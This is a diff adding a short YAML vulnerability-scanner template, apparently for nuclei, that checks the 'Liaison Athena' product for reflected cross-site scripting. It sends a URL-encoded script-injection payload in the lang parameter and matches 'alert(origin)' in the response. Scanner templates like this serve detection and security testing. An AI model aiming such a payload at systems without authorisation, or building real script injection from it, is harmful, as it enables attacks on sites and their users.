@@ -1,0 +1,18 @@
+id: LiaisonAthenaXss
+info:
+  name: Liaison Athena
+  author: jujutsu
+  severity: medium
+  reference:
+    - https://discord.com/channels/1064570904081862666/1065367430987255868/1070473607408521226
+  tags: xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28origin%29%3C%2Fscript%3E"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(origin)"
